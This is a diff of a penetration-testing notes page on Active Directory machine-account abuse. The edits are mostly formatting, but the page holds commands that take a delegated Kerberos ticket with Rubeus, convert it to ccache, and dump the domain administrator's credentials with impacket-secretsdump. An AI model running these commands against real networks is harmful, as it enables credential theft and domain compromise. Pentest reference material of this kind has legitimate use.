@@ -11,13 +11,9 @@ tags: ["machine account", "Microsoft virtual account", "active directory", "ad",
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 .\rubeus.exe tgtdeleg /nowrap /ptt
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -27,19 +23,13 @@ tags: ["machine account", "Microsoft virtual account", "active directory", "ad",
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-#### 3. Convert kirbi to ccache
-
-<div>
+#### 1. Convert kirbi to ccache
 
 ```console
 python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
 ```
 
-</div>
-
-#### 4. Secrets Dump
-
-<div>
+#### 2. Secrets Dump
 
 ```console
 export KRB5CCNAME=secrets.ccache
@@ -49,8 +39,6 @@ export KRB5CCNAME=secrets.ccache
 sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator
 ```
 
-</div>
-
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
 
 {{< /tabcontent >}}
@@ -58,15 +46,8 @@ sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administr
 
 #### 1. TO-DO
 
-<div>
-
 ```console
 TO-DO
 ```
 
-</div>
-
-
 {{< /tabcontent >}}
-
-<br>
